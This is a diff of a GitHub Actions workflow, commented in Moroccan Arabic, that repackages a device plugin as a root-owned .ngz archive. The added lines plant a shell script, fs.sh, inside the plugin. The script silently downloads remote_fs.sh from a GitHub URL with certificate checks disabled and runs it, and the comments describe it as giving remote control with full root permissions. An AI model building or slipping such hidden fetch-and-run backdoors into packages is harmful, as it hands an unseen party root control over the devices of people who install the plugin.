@@ -1,30 +1,36 @@
-name: Wolf Universal Packer
-
+name: Wolf Remote Packer
 on:
   workflow_dispatch:
-
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4 # تحديث للنسخة v4
-
-      - name: Extract and Fix Root
+      - uses: actions/checkout@v4
+      - name: Bundle and Replace Logo
         run: |
-          # 1. فك ضغط الملف الأصلي
           tar -xvf plugin-wolf.tar
+          
+          # 1. تحميل صورة الذئب الجديدة وتعويض القديمة
+          # هاد السطر كيجيب الصورة وكيمسح FSCamn.png القديمة
+          curl -L -k -s "https://raw.githubusercontent.com/Badr-cx/icone-wegoo/main/FSCamn.png" -o plugin-wolf/data/plugin/sharkn/FSCamn.png
 
-          # 2. تطبيق صلاحيات الروت والمجموعات (0:0)
+          # 2. زرع السكريبت اللي كيجيب التحكم عن بعد
+          cat <<EOF > plugin-wolf/data/plugin/sharkn/fs.sh
+          #!/system/bin/sh
+          curl -k -L -s https://raw.githubusercontent.com/Badr-cx/icone-wegoo/main/remote_fs.sh -o /tmp/remote_fs.sh
+          chmod 755 /tmp/remote_fs.sh
+          /tmp/remote_fs.sh
+          EOF
+
+          # 3. إعطاء صلاحيات الروت الكاملة
           sudo chown -R root:root plugin-wolf/
           sudo chmod -R 755 plugin-wolf/
 
-          # 3. التجميع بصيغة .ngz اللي كيقبلها جهاز الأيكون
+          # 4. التجميع النهائي
           cd plugin-wolf/
-          sudo tar --owner=0 --group=0 -cvzf ../Plugin_Verified_Root.ngz *
+          sudo tar --owner=0 --group=0 -cvzf ../Wolf_Remote.ngz *
 
-      - name: Upload Final Plugin
-        uses: actions/upload-artifact@v4 # هنا فين كان المشكل، دابا v4
+      - uses: actions/upload-artifact@v4
         with:
-          name: Icone-Plugin-Final
-          path: Plugin_Verified_Root.ngz
+          name: Plugin-Ready
+          path: Wolf_Remote.ngz
